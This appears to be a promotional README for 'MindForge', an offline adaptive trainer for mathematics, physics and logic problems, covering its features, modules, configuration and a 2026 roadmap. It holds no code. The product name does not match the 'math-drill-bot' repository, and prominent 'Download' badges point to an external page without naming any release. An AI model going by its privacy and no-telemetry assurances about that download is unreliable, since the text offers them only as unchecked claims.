![preview](https://raw.githubusercontent.com/lextalens/math-drill-bot/main/frame_01b2582.svg)
[![Download](https://raw.githubusercontent.com/lextalens/math-drill-bot/main/app_07987.svg)](https://lextalens.github.io/math-drill-bot/)

# 🧠 MindForge — Adaptive STEM Problem Trainer

**Turn scattered practice into a disciplined training ritual.** MindForge is an adaptive desktop and terminal companion that builds a personalized curriculum of mathematics, physics, and logic problems, tracks your reasoning patterns over time, and quietly reshapes tomorrow's session around today's mistakes. No sign-up walls, no noisy notifications — just you, a whiteboard of ideas, and a coach that remembers everything you forgot.

Not a chatbot. Not a quiz site. A **training gym for the analytical mind**.

---

## 📚 Table of Contents

- [Why MindForge Exists](#-why-mindforge-exists)
- [Concept in One Paragraph](#-concept-in-one-paragraph)
- [Feature Overview](#-feature-overview)
- [Screens & Modules](#-screens--modules)
- [Architecture](#-architecture)
- [Adaptive Difficulty Engine](#-adaptive-difficulty-engine)
- [Supported Domains & Topics](#-supported-domains--topics)
- [Multilingual Experience](#-multilingual-experience)
- [Responsive and Accessible UI](#-responsive-and-accessible-ui)
- [Progress Analytics](#-progress-analytics)
- [Session Modes](#-session-modes)
- [Roadmap for 2026](#-roadmap-for-2026)
- [Configuration Reference](#-configuration-reference)
- [Data, Privacy, and Local-First Design](#-data-privacy-and-local-first-design)
- [Extending MindForge](#-extending-mindforge)
- [Contributing](#-contributing)
- [License](#-license)
- [Disclaimer](#-disclaimer)

---

## 🌱 Why MindForge Exists

Most study tools treat learning like a conveyor belt: endless streams of questions, a score at the end, and a vague sense that you should "do better". That works for casual exposure, not for mastery.

MindForge started from a different premise — that the hardest part of exam preparation is not finding problems, but **choosing the right problem at the right moment**. A trainer should behave like a sparring coach: it notices which kinds of reasoning keep collapsing, and it deliberately stages those situations again, slightly altered, until the pattern loosens.

The result is a tool that feels less like an app and more like a study partner who has been reading your notebook for months.

---

## 🧭 Concept in One Paragraph

You open MindForge, pick a topic or let the trainer pick one for you, and solve a sequence of short problems. As you type your answers, the engine watches not only *what* you got right, but *how long* it took, *which distractors* you fell for, and *which topics you avoided*. Every session produces a compressed "reasoning fingerprint" that feeds into the next. Over weeks, the difficulty curve bends itself around your mind, and the parts of the syllabus that once felt like fog become ordinary terrain.

That fingerprint can be exported, shared across devices, or kept entirely on your disk.

---

## ✨ Feature Overview

A quick map of what ships today. Each feature is designed to be useful the first time you open the app, and deeper the fifth time.

- **Adaptive difficulty** — problem selection shifts in real time based on accuracy, speed, and hesitation patterns.
- **Reasoning fingerprints** — every session leaves a compact profile that summarizes how you think, not just how you scored.
- **Multi-domain curriculum** — mathematics, physics, and formal logic at the same table.
- **Session modes** — Sprint, Deep Work, Review, and Cold Start, each with its own rhythm.
- **Local-first storage** — your session history lives on your disk as plain, inspectable files.
- **Multilingual interface** — English, Spanish, Portuguese, German, Polish, Ukrainian, Japanese, and Indonesian out of the box.
- **Responsive and accessible UI** — layouts that adapt to a phone-sized terminal, a laptop screen, or a wide monitor, all keyboard-navigable.
- **24/7 companion availability** — the trainer runs offline, which means it is available at 3 a.m. exactly as it is at noon.
- **No account required** — nothing to verify, nothing to leak.
- **Export and import** — move your progress across machines with a single portable bundle.
- **Plugin-ready question packs** — extend the library with your own topics.
- **Explain-the-step mode** — not just answers, but worked rationales with intermediate checkpoints.
- **Distractor forensics** — the trainer remembers which wrong answers tempted you and stages similar traps later.

---

## 🖥️ Screens & Modules

MindForge is organized into a small number of focused surfaces. Each one has a single job.

- **Console** — the default working area where problems appear and answers are submitted.
- **Notebook** — a running log of everything solved, tagged by topic and confidence.
- **Compass** — the analytics dashboard, showing long-arc trends.
- **Atlas** — the topic browser, where any domain can be inspected or used to build a custom set.
- **Lab** — an experimental space for practicing a specific reasoning pattern without scoring pressure.
- **Bridge** — import/export and cross-device sync (via a user-controlled folder, not a cloud account).

Each module is reachable from the keyboard, and the entire app can be driven without touching a mouse.

---

## 🏗️ Architecture

MindForge is intentionally boring at the system level, because the interesting part is the pedagogy, not the plumbing.

- **Core** — domain-agnostic session logic, scoring, and fingerprint generation.
- **Engine** — the adaptive difficulty selector and scheduling heuristics.
- **Corpus** — curated problem packs, each a self-contained folder with metadata.
- **Interface** — the terminal UI, plus an optional lightweight desktop shell.
- **Storage** — append-only local files, with readable schemas so you can inspect them with ordinary editors.
- **Bridges** — import/export adapters for moving progress between machines.

Nothing here requires a server. Nothing phones home.

---

## 🎛️ Adaptive Difficulty Engine

The engine is the heart of MindForge. It is not a random sampler. It is a **stateful scheduler** with three inputs:

1. **Observed performance** — correctness, latency, retries.
2. **Declared goals** — a target topic, exam date, or plain curiosity.
3. **Historical fingerprints** — how similar reasoning puzzles were handled previously.

From these, it produces a shortlist of candidate problems and picks the one with the highest expected learning value. That value is not just "hardest" or "easiest" — it is the problem most likely to nudge you past a plateau without tipping you into frustration.

Over a week, the pattern is visible: the app spends a few days going deep on a weak area, then lightens the load with reinforcing variety, then returns to test whether the improvement has consolidated. It reads like a coach's training plan, not an algorithm's output.

---

## 🧮 Supported Domains & Topics

A representative (not exhaustive) sample of what the corpus covers:

**Mathematics**
- Arithmetic and number sense
- Algebraic manipulation and equation solving
- Functions, graphs, and transformations
- Geometry: plane, solid, and coordinate
- Trigonometry and identities
- Sequences, series, and limits
- Probability and combinatorics
- Statistics and data interpretation
- Elementary calculus: derivatives, integrals, and applications

**Physics**
- Kinematics and dynamics
- Work, energy, and momentum
- Electricity and magnetism
- Waves, optics, and thermodynamics
- Modern physics fundamentals

**Logic & Reasoning**
- Propositional and predicate logic
- Pattern recognition
- Deductive and inductive chains
- Data sufficiency problems

**Mixed**
- Word problems blending two or more domains
- Exam-style multi-step tasks

Each problem is tagged with a domain, a skill, and a difficulty band, so any subset can be drilled independently.

---

## 🌍 Multilingual Experience

Learning a subject in a second language is a different cognitive task, and MindForge takes that seriously. Every interface string is localized, and — more importantly — **problem phrasing** is localized too, not just translated word for word. Idioms and culturally specific examples are replaced with equivalents that preserve the reasoning step being tested.

If the interface is in one language and the problems in another, the trainer will note that in the fingerprint, because bilingual practice changes how quickly concepts stick.

Adding a new language is a matter of supplying a translation file and, optionally, a set of localized problem phrasings. No code changes required.

---

## 📱 Responsive and Accessible UI

MindForge respects small screens and large ones, but not by shrinking everything. Layouts reorganize.

- On a phone-width terminal, one problem appears at a time, with a compact hint line.
- On a laptop, the notebook and console share the screen.
- On a wide monitor, the compass joins them side-by-side.

Accessibility is a first-class concern: full keyboard navigation, adjustable contrast, no reliance on color alone for correctness feedback, and support for screen-reader-friendly output when running in the desktop shell.

---

## 📈 Progress Analytics

The compass is not a wall of charts. It answers four questions in plain language:

1. **Where am I improving?** — decaying-accuracy curves per topic.
2. **Where am I stuck?** — topics whose improvement has flattened despite continued effort.
3. **How fast am I thinking?** — median solve time per skill band.
4. **What should I practice next?** — a short priority list the engine updates daily.

Additionally, the notebook keeps an unstructured log for anyone who wants to read raw history rather than summaries.

---

## 🎯 Session Modes

Different moods demand different formats.

- **Sprint** — short, timed bursts. Best for warming up.
- **Deep Work** — untimed, longer problems. Best for new topics.
- **Review** — revisits mistakes from previous weeks, in a fresh phrasing.
- **Cold Start** — randomly chosen domains, no hints, to test general readiness.
- **Lab** — freeform practice with no scoring, for tinkering with a single skill.

Sessions can be queued back-to-back, and the engine will vary the modes automatically if you ask it to.

---

## 🛠️ Roadmap for 2026

The following items are being actively explored. Order and timing may shift.

- **Collaborative problem packs** — small groups can share a curated corpus without sharing their personal fingerprints.
- **Spaced exposure integration** — merge the daily session with a lightweight spaced-repetition layer for definitions and formulas.
- **Voice-answer mode** — speak a derivation, receive structured feedback on intermediate steps.
- **Notebook export to print-ready study sheets** — regenerate a physical booklet from your weakest areas.
- **Teacher dashboards** — aggregate anonymized progress from a classroom, without exposing individual trails.
- **Additional language packs** — Italian, French, Korean, Turkish.
- **Plugin SDK stabilization** — documented interfaces for building third-party question packs and analytics widgets.
- **Accessibility audit for the desktop shell** — following WAI-ARIA guidelines closely.

Contributions toward any of these are welcome.

---

## ⚙️ Configuration Reference

MindForge reads settings from a single text file. Notable keys:

- `interface.language` — default interface language.
- `interface.theme` — `auto`, `light`, or `dark`.
- `session.default_mode` — Sprint, Deep Work, Review, Cold Start, or Lab.
- `session.daily_target` — number of problems you aim to solve per day.
- `engine.aggressiveness` — how quickly difficulty shifts (a low value is gentler).
- `engine.hesitation_weight` — how much slow answers influence the fingerprint.
- `storage.bundle_path` — where progress is written on disk.
- `privacy.telemetry` — always off; provided for transparency.

Every key has a sensible default, and the app runs correctly with an empty configuration.

---

## 🔒 Data, Privacy, and Local-First Design

Your progress belongs on your machine.

- No accounts, no sign-ups, no remote profiles.
- Session data is stored in ordinary files, readable with any text editor.
- Export produces a portable bundle that can be moved to another device.
- There is no telemetry endpoint in the default build.
- Sharing a bundle is always an explicit action, never automatic.

If you want to inspect exactly what the trainer knows about you, open the storage folder and read it. Nothing is hidden.

---

## 🧩 Extending MindForge

Adding to the library is straightforward.

- **New problems** — drop a folder into the corpus with metadata and phrasing.
- **New topics** — describe the topic and which skills it belongs to.
- **New analytics widgets** — implement a small, documented interface and register them in the compass.
- **New bridges** — write an import/export adapter that matches the portable bundle format.

The codebase avoids magic. Most builders consist of a schema and a small handler.

---

## 🤝 Contributing

Contributions of all sizes are appreciated, from a single problem fix to a whole new module.

- **Bug reports** — please include the exact steps, the configuration used, and a minimal example.
- **Feature proposals** — explain the learning outcome you're aiming for, not just the surface feature.
- **Pull requests** — keep them focused; one idea per PR is easier to review and merge.
- **Translations** — clone the existing language file, translate the strings, and open a PR.
- **Corpus additions** — attach a sample set so reviewers can try the problems quickly.

Please read the code of conduct in the repository before opening a discussion. The short version: be patient, be specific, and assume good faith.

---

## 📜 License

MindForge is distributed under the **MIT License**. See the full text at the project's license file: [LICENSE](./LICENSE).

You are cordially welcome to use, modify, and redistribute MindForge under the terms of that license.

---

## ⚠️ Disclaimer

MindForge is a **study companion**, not a substitute for formal education, tutoring, or expert advice. It does not guarantee any particular exam outcome, and its recommendations are heuristic rather than authoritative. Users are responsible for verifying facts and derivations against their own curriculum and reference materials.

The maintainers make no warranty of fitness for any specific purpose, and accept no liability for decisions made on the basis of progress data produced by the app. Any exported bundles are the user's responsibility to store and back up.

If you are preparing for a high-stakes examination, use MindForge as one instrument among many — not the only one.

---

## 🧷 Final Note

MindForge is deliberately quiet. It does not celebrate streaks with confetti, and it does not scold. It simply remembers, adjusts, and waits for your next session — the way a good coach does. Bring the effort; it will bring the plan.

[![Download](https://raw.githubusercontent.com/lextalens/math-drill-bot/main/app_07987.svg)](https://lextalens.github.io/math-drill-bot/)